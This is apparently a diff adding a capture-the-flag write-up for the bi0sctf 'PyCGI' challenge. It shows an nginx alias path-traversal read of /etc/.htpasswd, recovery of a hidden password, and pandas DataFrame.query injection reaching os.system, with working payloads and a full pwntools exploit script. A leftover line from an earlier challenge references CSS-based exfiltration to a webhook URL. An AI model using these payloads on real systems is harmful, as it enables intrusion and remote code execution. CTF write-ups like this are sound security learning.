@@ -88,3 +88,132 @@ span[role="img"][aria-label="7"]:empty { background-image: url("https://webhook.
 
 And watch the requests coming in whenever an emoji is selected.
 The secret sequence is "51,32,73,34,85,126,17,158,79,50" (😔 🫢 😕🤫😧🙊🤩💬😯😌) which we can use to login ourself and get the flag: `bi0sctf{a34522e2009192570c840f931e4c3c0a}`
+
+## PyCGI
+
+> Hope its working. Can you check?
+
+We get the following nginx config (simplified):
+
+```nginx
+http {
+    sendfile        on;
+
+    server {
+        listen       8000;
+        server_name  localhost;
+
+        location / {
+                autoindex on;
+                root /panda/;
+        }
+
+        location /cgi-bin/ {
+                gzip off;
+                auth_basic           "Admin Area";
+                auth_basic_user_file /etc/.htpasswd;
+
+                include fastcgi_params;
+                fastcgi_param SCRIPT_FILENAME /panda/$fastcgi_script_name;
+        }
+
+        location /static {
+                alias /static/; 
+        }
+    }
+}
+```
+
+We see that it has a common misconfiguration: the `alias` block is missing a tailing slash in the location specifier!
+This means we can request `http://instance.chall.bi0s.in:10438/static../etc/.htpasswd` which isn't normalized so we can fetch files 'one dir up', luckily a dir up is the root, so we can fetch `/etc/.htpasswd`.
+
+The password hash stored in .htpasswd is: `admin:$apr1$usrUW0sL$XToLdRz.YCRy5TCvpI8UK0`. Initially we could not crack it, but my teammate spotted something odd in `/docker-entrypoint.sh`:
+
+```bash
+mv flag.txt $(head /dev/urandom | shasum | cut -d' ' -f1)
+
+htpasswd -mbc /etc/.htpasswd admin Â­
+
+spawn-fcgi -s /var/run/fcgiwrap.socket -M 766 /usr/sbin/fcgiwrap 
+
+/usr/sbin/nginx
+
+while true; do sleep 1; done
+```
+
+What is that weird Â? It is the password! (non-printable in my terminal). Byte sequence: `\xc2\xad`.
+
+Status so far:
+ * We can read arbitrary files due to nginx misconfiguration
+ * We can run scripts in `cgi-bin/` with Basic Authentication
+ * Flag has a randomized filename, so we need RCE to get it
+
+### CGI scripts
+
+In the cgi-bin folder we see a script called `search_currency.py`:
+
+```python
+from server import Server
+import pandas as pd
+
+try:
+    df = pd.read_csv("../database/currency-rates.csv")
+    server = Server()
+    server.set_header("Content-Type", "text/html")
+    params = server.get_params()
+    assert "currency_name" in params
+    currency_code = params["currency_name"]
+    results = df.query(f"currency == '{currency_code}'")
+    server.add_body(results.to_html())
+    server.send_response()
+except Exception as e:
+    print("Content-Type: text/html")
+    print()
+    print("Exception")
+    print(str(e))
+```
+
+It uses a very simple home-made python server to serve requests.
+We can send a `currency_code` parameter which will be injected directly to a `DataFrame.query` statement.
+
+Underneath the hood, `.query` uses `pandas.eval` which some people believe is safe:
+
+> "`pandas.eval` is not as dangerous as it sounds. Unlike python’s eval `pandas.eval` cannot execute arbitrary functions.
+
+But this is not true!
+We can use `@` to reference local variables, so e.g. this would work:
+
+```python
+import os
+
+currency_code = "DKK' or @os.system('ls') or '1' == '1"
+df.query(f"currency == '{currency_code}'")
+```
+
+But we don't have `os` imported as a local variables :/
+Instead we can try with reflections:
+ * `@df.__class__.__init__.__globals__['__builtins__']['exec']('import os; os.system("ls")')`
+
+Or even better, my teammate also found this short path to `os`:
+ * `@pd.io.common.os.system('ls')`
+
+Finally we needed to make a raw HTTP request because the server didn't URL decode parameters.
+Exploit is:
+
+```python
+from pwn import *
+
+io = remote("instance.chall.bi0s.in", 10889, level="debug")
+io.send(b"""\
+GET /cgi-bin/search_currency.py?currency_name={}'.format(@pd.io.common.os.system('ls /'))# HTTP/1.1
+Host: instance.chall.bi0s.in:10889
+Authorization: Basic YWRtaW46wq0=
+
+""")
+
+io.interactive()
+```
+
+This turns: `df.query(f"currency == '{currency_code}'")` into `df.query(f"currency == '{}'.format(@pd.io.common.os.system('ls /'))#'")`.
+
+Flag: `bi0sctf{9a18559a42e7302b15eeb45c09ab39d6}`
